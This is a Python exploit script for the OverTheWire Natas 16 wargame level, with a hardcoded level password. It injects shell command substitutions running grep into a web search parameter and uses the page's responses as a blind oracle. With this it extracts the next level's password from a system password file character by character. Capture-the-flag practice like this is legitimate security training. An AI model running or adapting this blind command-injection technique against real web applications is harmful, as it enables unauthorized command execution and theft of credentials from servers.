import requests
import string

username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
url = f"http://natas16.natas.labs.overthewire.org/"
chars = string.ascii_letters + string.digits
found_chars = []

for c in chars:
    r = requests.get(url, auth=(username, password),
                     params={"needle": f"$(grep {c} /etc/natas_webpass/natas17)", "submit": "Search"})
    if "African" not in r.text:
        found_chars.append(c)
        print(f"Found char: {c}")

print(f"Password contains: {''.join(found_chars)}")
nataspass = ''
while len(nataspass) < 32:
    for c in found_chars:
        r = requests.get(url, auth=(username, password),
                         params={"needle": f"$(grep ^{nataspass + c} /etc/natas_webpass/natas17)", "submit": "Search"})
        if "African" not in r.text:
            nataspass += c
            print(f"Found so far: {nataspass}")
            break

print(f"Password: {nataspass}")